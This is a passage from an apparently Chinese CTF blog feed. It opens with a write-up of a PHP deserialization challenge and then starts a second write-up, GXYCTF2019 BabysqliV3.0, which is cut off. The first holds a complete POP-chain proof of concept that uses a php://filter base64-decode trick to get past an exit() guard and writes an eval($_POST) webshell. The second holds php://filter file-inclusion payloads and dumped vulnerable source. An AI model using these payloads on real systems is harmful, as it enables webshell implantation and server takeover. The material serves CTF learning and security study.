language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br> <br>        <span class="hljs-comment">// 获取过期时间</span><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-comment">// 获取缓存的键名</span><br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br> <br>        <span class="hljs-comment">// 获取缓存文件所在的目录</span><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br> <br>        <span class="hljs-comment">// 如果目录不存在</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 创建目录，权限为 0755，允许递归创建</span><br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 处理创建目录失败的情况</span><br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-comment">// 序列化数据</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br> <br>        <span class="hljs-comment">// 如果开启了数据压缩且 gzcompress 函数存在</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">// 对数据进行压缩</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br> <br>        <span class="hljs-comment">// 在数据前添加过期时间和退出语句</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-comment">// 将数据写入文件</span><br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br> <br>        <span class="hljs-comment">// 如果写入成功</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> <br>&#125;<br> <br><span class="hljs-comment">// 如果 GET 请求中包含 src 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-comment">// 高亮显示当前文件的源代码</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br> <br><span class="hljs-comment">// 定义上传目录</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br> <br><span class="hljs-comment">// 如果上传目录不存在</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-comment">// 创建上传目录</span><br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br> <br><span class="hljs-comment">// 对 GET 请求中的 data 参数进行反序列化操作</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><h3 id="class-B"><a href="#class-B" class="headerlink" title="class B"></a>class B</h3><p>base64 + filter协议绕过死亡exit</p><p>B类里有一个file_put_contents函数可以利用写入shell，位于B::set()</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$result = file_put_contents($filename, $data)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>溯源$filename</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$filename = $this-&gt;getCacheKey($name)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>接着去溯源B::getCachekey()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的$options是一个数组，可以控制，$name也是一个可以控制的变量，所以文件名和前缀都是可以控制的，并且这个$name来自于B::set()的传入参数</p><hr><p>再看看$data</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">$data = &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>\n<span class="hljs-comment">//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;</span></span><span class="language-xml">\n&quot; . $data;</span><br></code></pre></td></tr></table></figure><p>这里的命令是拼接在exit()之后的，如果写入的话我们命令永远无法执行，叫做死亡exit()。</p><h3 id="死亡exit"><a href="#死亡exit" class="headerlink" title="死亡exit()"></a>死亡exit()</h3><p>引用大佬文章：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">谈一谈php:&#x2F;&#x2F;filter的妙用@PHITHON</a></p><p>简而言之就是将命令先base64，拼接到exit()之后，再用filter协议base64解码写入。这里的sprintf是12位数字，传入的$expire&#x3D;0即可。由于解码自动跳过非法字符，这样死亡exit()就会只剩下base64密文php&#x2F;&#x2F;000000000000exit还有后面的命令，同时由于base64是每4字符一组，所以后面$data要补三个可见字符凑够12字符，这样传入的base64密文如下，再经过一次base64后就是php命令了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php<span class="hljs-regexp">//</span><span class="hljs-number">000000000000</span><span class="hljs-keyword">exit</span>(待执行命令的base64)<br></code></pre></td></tr></table></figure><p>刚好file_put_contents支持解析伪协议：那么B::$options[‘prefix’]赋值为php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;，传入B::set()的参数$expire赋值为任意不超过12位数字，先去追一下$expire的来源</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$expire = $this-&gt;getExpireTime($expire)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>溯源到B::getExpireTime()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后有个赋值判断</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span> (is_null(<span class="hljs-symbol">$</span>expire)) &#123;<br>    <span class="hljs-symbol">$</span>expire = <span class="hljs-symbol">$</span>this-&gt;<span class="hljs-keyword">options</span>[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>然后$expire来源于set传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span><br></code></pre></td></tr></table></figure><p>所以$expire可以来自传参也可以是B::$options[‘expire’]</p><hr><p>继续在追一下$data，发现上面有一个数据压缩的函数，因为要绕过exit()，这里不能让其被压缩，所以我们需要把options[‘data_compress’]赋值为false</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span>this-&gt;<span class="hljs-keyword">options</span>[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>    <span class="hljs-comment">//数据压缩</span><br>     <span class="hljs-symbol">$</span>data = gzcompress(<span class="hljs-symbol">$</span>data, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>再往上找$data的来源，找到B::serialize($value)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">serialize</span>(<span class="hljs-variable">$value</span>)<br></code></pre></td></tr></table></figure><p>$value来自B::set()的传参，是在B类自己定义的，这里可控。</p><p>这里还有传入一个函数方法，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关于B::serialize()的说明</strong><br><strong>这一步serialize是一次多余的操作，我们的目标就是要经过这个函数处理，但是返回的内容不变，可以选择编码（传入base64，再此解码）、或者是去除传入命令两侧的空白字符（rtrim）等，啥都不干就行，payload默认选择进行一次base64解码</strong></p><h3 id="class-A"><a href="#class-A" class="headerlink" title="class A"></a><strong>class A</strong></h3><p>首先是析构函数</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __destruct() &#123;<br>    <span class="hljs-keyword">if</span> (!$<span class="hljs-keyword">this</span>-&gt;autosave) &#123;<br>        $<span class="hljs-keyword">this</span>-&gt;save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以要进入save函数，首先要使A::$autosave赋值为0，save函数调用了set函数</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">public function save() &#123;<br>    $<span class="hljs-function"><span class="hljs-title">contents</span> = $this-&gt;</span>getForStorage();<br><br>    $<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">store</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">set</span>($this-&gt;</span><span class="hljs-function"><span class="hljs-title">key</span>, $<span class="hljs-built_in">contents</span>, $this-&gt;</span>expire);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只要使A::$store赋值为new B()，就能成功调用B::set()，然后这里的$key就是写入的文件名，$contents就是写入的内容。</p><p>再溯源$contents。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function getForStorage() &#123;<br>    $cleaned = $<span class="hljs-keyword">this</span>-&gt;cleanContents($<span class="hljs-keyword">this</span>-&gt;cache);<br><br>    <span class="hljs-keyword">return</span> json_encode([$cleaned, $<span class="hljs-keyword">this</span>-&gt;complete]);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的$cleaned来源于<code>$A::cache</code>，是一个空数组；写入内容又来源于<code>A::$complete</code></p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>经过一次B::serialize()，这里我们进行一次多余的操作也就是base64_decode，因此<code>A::$complete</code>需要一次<code>base64_encode()</code></p><p>然后就是绕过死亡exit()，之前说了要凑3个多余字符，然后之后就是执行命令的base64编码</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">A::$complete = base64_encode(&#x27;aaa&#x27;.base64_encode(&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;));</span><br></code></pre></td></tr></table></figure><h3 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">A::__destruct<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>A::cleanContents<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>A::getForStorage<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>A::save<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>B::serialize<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>B::getCacheKey<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>B::getExpireTime<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>B::set<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>file_put_contents()<br></code></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// 进入A::save()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;autosave = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// B::set()入口</span><br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-comment">// 初始赋值</span><br>        <span class="hljs-variable language_">$this</span>-&gt;cache = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-comment">// 写入webshell的文件名</span><br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-string">&#x27;1.php&#x27;</span>;<br><span class="hljs-comment">// payload</span><br>        <span class="hljs-variable language_">$this</span>-&gt;complete = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>));<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$options</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;options = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-comment">// 绕过死亡exit使用filter伪协议</span><br>        <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=&#x27;</span>;<br>        <span class="hljs-comment">// 跳过数据压缩</span><br>        <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 什么都不做的函数，这里执行一次base64解码</span><br>        <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>] = <span class="hljs-string">&#x27;base64_decode&#x27;</span>;<br>        <span class="hljs-comment">// 补齐sprintf</span><br>        <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>()));<br></code></pre></td></tr></table></figure><p>然后蚁剑连接</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">http://d7677f7f-9ff5-<span class="hljs-number">4b54</span>-85c7-18de6a27f3c9.node5.buuoj.cn:<span class="hljs-number">81</span>/<span class="hljs-number">1.</span>php<br></code></pre></td></tr></table></figure><p>即可拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base64+filter协议绕过死亡exit </tag>
            
            <tag> php反序列化 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-BabysqliV3.0</title>
      <link href="/2025/05/07/GXYCTF2019-BabysqliV3-0/"/>
      <url>/2025/05/07/GXYCTF2019-BabysqliV3-0/</url>
      
        <content type="html"><![CDATA[<h1 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="GXYCTF2019-BabysqliV3.0"></a>GXYCTF2019-BabysqliV3.0</h1><p>参考博客：<a href="https://blog.csdn.net/2401_86760082/article/details/145358326">https://blog.csdn.net/2401_86760082/article/details/145358326</a></p><p>首先打开网页是一个登录界面。</p><p><img src="/../image/GXYCTF2019-BabysqliV3.0-1.png"></p><p>先尝试用万能密码登录，但是当输入带符号的用户名时会提示用户不存在。</p><p>尝试使用弱口令密码爆破：</p><p>用户名：admin</p><p>密码：password</p><p>成功登录之后发现是一个文件上传的页面。</p><p><img src="/../image/GXYCTF2019-BabysqliV3.0-2.png"></p><p>尝试上传一句话木马发现回被转成了文本，并且把路径给了我们。</p><p><img src="/../image/GXYCTF2019-BabysqliV3.0-3.png"></p><p>可以看到url传参里有?file&#x3D;upload，猜测这里存在文件包含，尝试使用伪协议配合文件包含漏洞读取源码。</p><p>构造伪协议。</p><p>home.php</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=home<br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=upload<br></code></pre></td></tr></table></figure><p>利用伪协议得到home.php和upload.php，需要先进行base64解码</p><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/home$/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/upload$/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;.fxxkyou!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当前引用的是 &quot;</span>.<span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-variable">$file</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no permission!&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><br><span class="language-xml"> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="language-xml">上传文件</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"> </span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;</span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>;</span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;</span><br><span class="language-php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;</span><br><span class="language-php"></span><br><span class="language-php"> </span><br><span class="language-php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span 